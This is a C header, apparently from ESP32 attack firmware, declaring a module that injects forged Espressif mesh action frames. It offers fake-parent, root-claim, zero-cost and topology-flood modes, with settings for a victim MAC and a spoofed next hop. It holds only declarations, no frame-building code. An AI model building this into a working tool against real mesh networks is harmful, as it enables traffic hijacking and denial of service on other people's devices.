/**
 * mesh_route_poison.h
 *
 * Mesh Routing Table Poisoning — inject forged Espressif mesh vendor
 * action frames that advertise fake parents, routes, root claims, and
 * low path costs to corrupt mesh routing decisions.
 */

#ifndef MESH_ROUTE_POISON_H
#define MESH_ROUTE_POISON_H

#include <stdbool.h>
#include <stdint.h>
#include "esp_err.h"
#include "cJSON.h"

#define MESH_ROUTE_POISON_TIMEOUT_SEC  120
#define MESH_ROUTE_POISON_TIMEOUT_US   (MESH_ROUTE_POISON_TIMEOUT_SEC * 1000000ULL)

typedef enum {
    MESH_ROUTE_POISON_MODE_NONE = 0,
    MESH_ROUTE_POISON_MODE_FAKE_PARENT,   /* Advertise attacker as preferred parent */
    MESH_ROUTE_POISON_MODE_ROUTE_ADV,     /* Flood fake route advertisements */
    MESH_ROUTE_POISON_MODE_ROOT_CLAIM,    /* Claim to be mesh root */
    MESH_ROUTE_POISON_MODE_COST_POISON,   /* Advertise zero/low path cost */
    MESH_ROUTE_POISON_MODE_TOPOLOGY,      /* Flood fake topology updates */
    MESH_ROUTE_POISON_MODE_COMBINE,       /* Rotate all poison types */
    MESH_ROUTE_POISON_MODE_COUNT
} mesh_route_poison_mode_t;

typedef struct {
    uint8_t                  parent_bssid[6];
    uint8_t                  target_mac[6];      /* victim / destination; FF:FF.. = broadcast */
    bool                     target_mac_set;
    uint8_t                  fake_next_hop[6];   /* spoofed next-hop / parent MAC */
    bool                     fake_next_hop_set;
    uint8_t                  channel;
    mesh_route_poison_mode_t mode;
    char                     ssid[33];
    uint16_t                 interval_ms;
    uint16_t                 burst_size;
    uint8_t                  hop_count;          /* fake hop count (default 1) */
    uint16_t                 path_cost;          /* fake path cost (default 0) */
} mesh_route_poison_config_t;

typedef struct {
    bool                     active;
    bool                     timeout;
    mesh_route_poison_mode_t mode;
    uint32_t                 packets_sent;
    uint32_t                 packets_failed;
    uint32_t                 fake_parent_sent;
    uint32_t                 route_adv_sent;
    uint32_t                 root_claim_sent;
    uint32_t                 cost_poison_sent;
    uint32_t                 topology_sent;
    uint32_t                 uptime_ms;
    uint8_t                  channel;
    uint8_t                  parent_bssid[6];
    uint8_t                  target_mac[6];
    uint8_t                  fake_next_hop[6];
    uint8_t                  hop_count;
    uint16_t                 path_cost;
    char                     ssid[33];
    char                     mode_str[32];
    char                     error[64];
} mesh_route_poison_state_t;

void      mesh_route_poison_init(void);
esp_err_t mesh_route_poison_start(const mesh_route_poison_config_t *cfg);
esp_err_t mesh_route_poison_stop(void);
bool      mesh_route_poison_is_active(void);
const mesh_route_poison_state_t *mesh_route_poison_get_state(void);
const char *mesh_route_poison_mode_str(mesh_route_poison_mode_t m);
cJSON    *mesh_route_poison_get_status_json(void);

#endif /* MESH_ROUTE_POISON_H */
